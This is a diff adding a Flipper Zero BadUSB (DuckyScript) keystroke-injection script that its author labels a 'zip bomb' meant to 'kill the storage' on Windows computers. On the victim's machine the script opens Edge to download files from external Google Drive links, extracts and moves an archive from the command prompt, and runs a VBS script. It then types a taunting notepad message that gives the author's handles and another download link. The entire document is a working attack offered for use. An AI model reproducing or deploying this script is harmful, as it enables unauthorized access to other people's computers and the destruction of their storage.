@@ -1,0 +1,67 @@
+
+REM This Script Was Made By RE3Z
+REM WARNING! This Will Zip Bomb Your Computer AKA Kill The Storage On A Windows Computer
+REM This Is Made For The FLipper Zero To Hack Windows OS
+
+DELAY 1000
+GUI r
+DELAY 1200
+STRING msedge
+ENTER
+DELAY 1300
+STRING https://drive.usercontent.google.com/download?id=1Rxj7C1yprcmdFT5ZVrHMiuCZ7EJUutzb&export=download&authuser=0&confirm=t&uuid=3a1bd379-18f8-4f11-99c5-6a4bf20ac7da&at=APZUnTVODaDlmV0oL9bAtsS8y1hl:1706387407441
+ENTER
+DELAY 11000
+GUI r
+DELAY 1200
+STRING msedge
+ENTER
+DELAY 1300
+STRING https://drive.usercontent.google.com/download?id=1lKR9OYHANNPm9Zp2mNUJwkvORB4rDhaR&export=download&authuser=0&confirm=t&uuid=b8acdfa5-747d-4ae3-ac37-31794290cb4b&at=APZUnTUAe0yM_uWfcCgVgHRFW8lC:1706442976502
+ENTER
+DELAY 11000
+GUI r
+DELAY 1200
+STRING cmd
+ENTER
+DELAY 1800
+STRING @echo off
+ENTER
+DELAY 300
+STRING color 2
+ENTER
+DELAY 200
+STRING cls
+ENTER
+DELAY 300
+STRING cd Downloads
+ENTER
+DELAY 500
+STRING tar -xf system32.zip
+ENTER
+DELAY 1500
+STRING move /y system32.zip Desktop
+ENTER
+DELAY 1200
+STRING move /y system32 Desktop
+ENTER
+STRING cscript HackedMsg.vbs
+ENTER
+DELAY 1200
+STRING exit
+ENTER
+DELAY 2000
+GUI r
+DELAY 1200
+STRING notepad.exe
+ENTER
+DELAY 1200
+STRING ZIP Bombed By RE3Z LOL
+ENTER
+STRING Discord: re3z_21
+ENTER 
+STRING Github: themanwalks
+ENTER
+STRING Download My Hack That RE3Z Launched Onto Your Computer Here:
+ENTER
+STRING https://drive.usercontent.google.com/download?id=1g8-i_zlOC8deId736vdGbmzNFiLWG6zj&export=download&authuser=0&confirm=t&uuid=29985689-6420-4073-8649-ed9ce6fdcedc&at=APZUnTXp5P09lS0xXwwpbopMiqNo:1706441739952
